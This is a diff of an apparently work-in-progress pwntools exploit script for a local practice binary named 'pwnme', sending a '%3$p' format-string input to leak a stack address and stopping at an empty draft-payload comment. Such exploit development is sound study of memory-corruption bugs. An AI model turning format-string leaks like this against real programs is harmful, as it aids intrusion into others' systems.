@@ -15,14 +15,15 @@ Radare2:
 afl --> list all functions
 
 %3$p is a stack address with PIE off
+
+Where do you write
 '''
 
 # Import libraries
 from pwn import *
 
 # ELF of current runnnig process + libc of it
-elf = ELF("./pwnme",checksec=False)
-libc = elf.libc
+elf = ELF("./pwnme",checksec=False)     # Will be calling libc via elf.libc
 
 # Knows the context to debug in
 DEBUG = False
@@ -39,5 +40,11 @@ stackLeakFormat = b"%3$p"
 
 # start process
 p=process("./pwnme")
-p.send(stackLeakFormat)
-resp = p.recvuntil(b'0x')     # Should be "Starting Echo Machine" with leak
+resp = p.recvline()   # Should be "Starting Echo Machine"
+
+# Generate Leak
+p.sendline(stackLeakFormat)
+leak = p.recvuntil(b'\n')
+leakInt = int(leak,16)  # Use in EIP?
+
+# Draft Payload: 
